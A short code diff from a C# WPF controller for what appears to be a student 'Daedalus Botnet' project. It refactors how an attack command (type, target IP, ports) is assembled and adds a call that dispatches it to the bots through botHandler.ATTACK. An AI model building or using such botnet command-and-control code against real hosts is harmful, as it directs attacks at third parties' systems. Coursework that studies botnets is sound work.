@@ -8,10 +8,11 @@ using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Media;
 using Coms4507_Project.BotHandling;
+using Newtonsoft.Json.Linq;
 /**
- *  Author: Angus Moore
- *  Project: Coms4507 Daedalus Botnet Project.
- */
+*  Author: Angus Moore
+*  Project: Coms4507 Daedalus Botnet Project.
+*/
 namespace Coms4507_Project
 {
 
@@ -232,14 +233,17 @@ namespace Coms4507_Project
             string ports = PORTS.Text;
             string runtime = "*"; // Deprecated: hardcoded because we don't support runtimes anymore but the APIs use it.
 
-            Dictionary<string, string> attackMessage = new Dictionary<string, string>();
-            attackMessage.Add("request", "attack");
-            attackMessage.Add("attack", attackType);
-            attackMessage.Add("targetIP", targetIp);
-            attackMessage.Add("ports", "[" + ports.Trim() + "]");
-            attackMessage.Add("runtime", runtime);
+            Dictionary<string, string> attackMessage = new Dictionary<string, string>
+            {
+                { "request", "attack" },
+                { "attack", attackType },
+                { "targetIP", targetIp },
+                { "ports", "[" + ports.Trim() + "]" },
+                { "runtime", runtime }
+            };
 
             attackStatus = "ATTACK";
+            botHandler.ATTACK(JObject.FromObject(attackMessage).ToString());
 
             ATTACK_BUTTON.Background = new SolidColorBrush(Colors.LawnGreen);
             ATTACK_BUTTON.Content = "STOP ATTACK";
